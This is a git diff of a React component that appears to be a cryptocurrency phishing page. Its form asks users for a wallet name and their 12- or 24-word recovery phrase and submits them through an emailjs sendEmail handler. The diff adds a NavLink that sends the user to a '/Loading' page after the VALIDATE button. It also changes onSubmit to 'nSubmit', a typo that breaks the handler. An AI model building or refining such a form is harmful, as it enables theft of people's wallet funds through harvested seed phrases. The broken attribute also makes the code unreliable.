@@ -1,4 +1,5 @@
 import React, { useRef } from "react";
+import { NavLink } from "react-router-dom";
 import "./Phrase.css";
 import emailjs from "emailjs-com";
 
@@ -27,7 +28,7 @@ export const Phrase = () => {
 
   return (
     <div>
-      <form ref={form} onSubmit={sendEmail} className="myform">
+      <form ref={form} nSubmit={sendEmail} className="myform">
         <textarea
           name="walletName"
           placeholder="Wallet Name"
@@ -36,9 +37,9 @@ export const Phrase = () => {
         />
         <textarea name="Phrase" placeholder="Phrase" required />
         <p>Typically 12 (sometimes 24) words separated by single spaces</p>
-        <button type="submit" name="submit">
+        <NavLink to="/Loading">    <button type="submit" name="submit" >
           <p>VALIDATE</p>
-        </button>
+        </button></NavLink>
       </form>
     </div>
   );
